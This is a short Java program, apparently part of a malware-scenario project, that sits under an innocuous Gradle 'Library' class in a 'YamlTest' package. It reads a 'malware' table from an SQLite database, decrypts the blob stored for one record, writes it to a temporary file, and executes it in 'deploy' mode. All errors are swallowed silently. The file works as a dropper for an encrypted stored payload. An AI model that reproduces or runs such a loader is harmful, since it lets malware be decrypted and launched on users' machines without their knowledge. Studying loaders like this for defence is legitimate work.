/*
 * This Java source file was generated by the Gradle 'init' task.
 */
package YamlTest;

import java.io.File;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.HashMap;

import database.SqliteDatabase;
import scenarios.Scenario;
import scenarios.ScenarioBuilder;
import scenarios.ScenarioHelper;

public class Library {

	public static void main(String[] args) {

		ScenarioHelper sch = new ScenarioHelper();
		ScenarioBuilder scb = new ScenarioBuilder();
		HashMap<Integer, Scenario> scenarios = scb.getScenarios();
		String db = "filesDb.sqlite";
		SqliteDatabase sqliteDB;

		for (Integer key : scenarios.keySet()) {
			System.out.println("#####" + scenarios.get(key).toString());
		}

		if (!new File(SqliteDatabase.PATH + "\\" + db).exists()) {
			sqliteDB = new SqliteDatabase(db);
			sqliteDB.createDatabase();
			sqliteDB.createTables();
		} else {
			sqliteDB = new SqliteDatabase(db);
		}

		String sql = "SELECT * FROM malware";

		try (Connection conn = sqliteDB.connect();
				Statement stmt = conn.createStatement();
				ResultSet rs = stmt.executeQuery(sql)) {

			while (rs.next()) {
				System.out.println("ID: " + rs.getInt("idNumber"));
				if (rs.getInt("idNumber") == 9) {
					File tempFile = sch.convertBytesToFile(rs.getBytes("dMalware"));
					sqliteDB.getSecretKey().decryptFile(tempFile);
					sch.executeFile(tempFile, "c++", "deploy");
				} else {

				}
			}
		} catch (Exception e) {

		}
	}

}
